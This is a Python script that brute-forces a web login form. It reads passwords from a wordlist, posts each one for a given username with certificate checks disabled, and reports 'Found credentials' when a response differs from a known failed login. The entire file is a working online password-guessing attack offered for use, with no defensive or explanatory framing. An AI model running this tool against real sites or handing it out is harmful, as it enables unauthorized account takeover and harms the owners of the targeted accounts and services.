import sys
import requests
import urllib3
import threading
from functools import cache
import time

urllib3.disable_warnings()
incicators = ["Error", "error", "Login failed", "LOGIN FAILED"]

url = sys.argv[1]
wordlist = sys.argv[3]
param = sys.argv[4].split(",")
cookies = {}
c = sys.argv[5].split(",")
for ci in c:
    cookies.update({ci.split("=")[0] : ci.split("=")[1]})
user = sys.argv[6]
extraparam = sys.argv[7].split(",")
extra = {}
for i in extraparam:
    extra.update({i.split("=")[0] : i.split("=")[1]})

starttime = time.time()

lines = set()
w = open(wordlist, "rb")
for l in w.readlines():
    lines.add(l.rstrip())
w.close



try:
    lines.remove(b'')
except:
    pass

print("Wordlist loaded")
testing_cred = {param[0] : user, param[1] : "asdasdlaksdk"}
testing_cred.update(extra)

test_site = requests.post(url, data=testing_cred, verify=False, cookies=cookies).content

print("Got test response successfull")

@cache
def test_cred(pwd):
    params = {param[0] : user, param[1] : pwd}
    params.update(extra)
    req = requests.post(url, data=params, verify=False, cookies=cookies)
    if  req.content != test_site:
        return True

@cache
def main():
    count = 0
    max = len(lines)
    for w in lines:

        r = test_cred(w.decode())
        print(f"Tested {count}/{max}", end="\r")
        
        if r:
            print(f"Found credentials: {user}:{w.decode()}")
            timeneeded = time.time() - starttime
            print(f"Finished in {timeneeded}s, {count/timeneeded} req/s")
            break
        count += 1
if __name__ == '__main__':
    main()